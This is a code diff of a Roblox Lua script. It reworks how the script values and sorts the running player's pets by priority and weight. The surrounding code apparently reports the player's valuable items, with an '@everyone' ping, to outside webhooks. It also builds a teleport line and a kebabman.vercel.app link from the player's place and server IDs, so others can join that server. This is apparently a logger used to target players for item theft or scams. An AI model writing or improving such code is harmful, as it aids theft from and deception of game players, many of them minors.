@@ -58,53 +58,10 @@ local function getPriorityEmoji(name)
     return nil
 end
 
--- Format pet line with bonus and safe weight/age
-local function formatPetLine(name)
-    local priorityEmoji = getPriorityEmoji(name)
-    local baseValue = 0
-    for petName, petValue in pairs(PRIORITY_VALUES) do
-        if string.find(string.lower(name), string.lower(petName)) then
-            baseValue = petValue
-            break
-        end
-    end
-
-    -- Safe weight
-    local weight = 0
-    local kgMatch = string.match(name, "(%d+%.?%d*)%s*[Kk][Gg]?")
-    if kgMatch then weight = tonumber(kgMatch) or 0 end
-
-    -- Safe age
-    local ageText = ""
-    local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
-    if ageMatch then ageText = "[Age "..ageMatch.."]" end
-
-    local emoji = ""
-    local displayValue = baseValue
-
-    if priorityEmoji then
-        if weight >= 30 then
-            emoji = "[💪] ["..priorityEmoji.."]"
-            displayValue = displayValue + 3000 -- bonus
-        else
-            emoji = "["..priorityEmoji.."]"
-        end
-    else
-        if weight >= 15 then
-            emoji = "💪"
-        else
-            emoji = "🐶"
-        end
-    end
-
-    return emoji.." - "..name.." "..ageText.." → "..displayValue.."¢"
-end
-
--- Collect pets with bonus and sort descending by value
+-- Collect pets into categories and sort
 local function collectPets(container)
-    local items, hasPriorityPet = {}, false
     if not container then return {},0,false end
-
+    local items, hasPriorityPet = {}, false
     for _, obj in ipairs(container:GetChildren()) do
         if obj:IsA("Tool") and isPet(obj.Name) then
             table.insert(items,obj.Name)
@@ -112,36 +69,73 @@ local function collectPets(container)
         end
     end
 
-    local petsWithValue = {}
+    local priorityStrong, priorityNormal, strong, normal = {}, {}, {}, {}
     local totalValue = 0
 
     for _, name in ipairs(items) do
-        local line = formatPetLine(name)
-        local displayValue = tonumber(string.match(line,"→ (%d+)¢") or "0")
+        local weight = tonumber(string.match(name,"(%d+%.?%d*)%s*[Kk][Gg]?") or "0")
+        local ageMatch = string.match(name,"%[Age%s*(%d+)%]") or ""
+        local ageText = ageMatch ~= "" and "[Age "..ageMatch.."]" or ""
+        local priorityEmoji = getPriorityEmoji(name)
+        local baseValue = 0
+        for petName, petValue in pairs(PRIORITY_VALUES) do
+            if string.find(name:lower(), petName:lower()) then
+                baseValue = petValue
+                break
+            end
+        end
+        local displayValue = baseValue
+        local line = ""
+
+        if priorityEmoji then
+            if weight >= 30 then
+                displayValue = displayValue + 3000
+                line = "[💪] ["..priorityEmoji.."] - "..name.." "..ageText.." → "..displayValue.."¢"
+                table.insert(priorityStrong, {line=line,value=displayValue})
+            else
+                line = "["..priorityEmoji.."] - "..name.." "..ageText.." → "..displayValue.."¢"
+                table.insert(priorityNormal, {line=line,value=displayValue})
+            end
+        else
+            if weight >= 15 then
+                line = "💪 - "..name.." "..ageText.." → "..displayValue.."¢"
+                table.insert(strong, {line=line,value=displayValue})
+            else
+                line = "🐶 - "..name.." "..ageText.." → "..displayValue.."¢"
+                table.insert(normal, {line=line,value=displayValue})
+            end
+        end
+
         totalValue = totalValue + displayValue
-        table.insert(petsWithValue, {line=line,value=displayValue})
     end
 
-    table.sort(petsWithValue, function(a,b) return a.value > b.value end)
+    -- Sort each category descending
+    local function sortDesc(t) table.sort(t,function(a,b) return a.value>b.value end) end
+    sortDesc(priorityStrong)
+    sortDesc(priorityNormal)
+    sortDesc(strong)
+    sortDesc(normal)
 
+    -- Merge categories
     local formatted = {}
-    for _, entry in ipairs(petsWithValue) do table.insert(formatted, entry.line) end
+    for _,cat in ipairs({priorityStrong,priorityNormal,strong,normal}) do
+        for _,entry in ipairs(cat) do table.insert(formatted,entry.line) end
+    end
 
     return formatted,totalValue,hasPriorityPet
 end
 
--- Wait for Backpack and Character
+-- Wait for Backpack & Character
 local backpack = player:WaitForChild("Backpack")
 local char = player.Character or player.CharacterAdded:Wait()
 
-local backpackList,backpackValue,hasPriorityBackpack = collectPets(backpack)
-local equippedList,equippedValue,hasPriorityEquipped = collectPets(char)
+local backpackList, backpackValue, hasPriorityBackpack = collectPets(backpack)
+local equippedList, equippedValue, hasPriorityEquipped = collectPets(char)
 local totalValue = backpackValue + equippedValue
-
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
+
 local pingText = hasPriority and "--@everyone\n" or ""
 local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL
-
 local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s")',game.PlaceId,game.JobId)
 local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId)
 local contentText = pingText..teleportLine
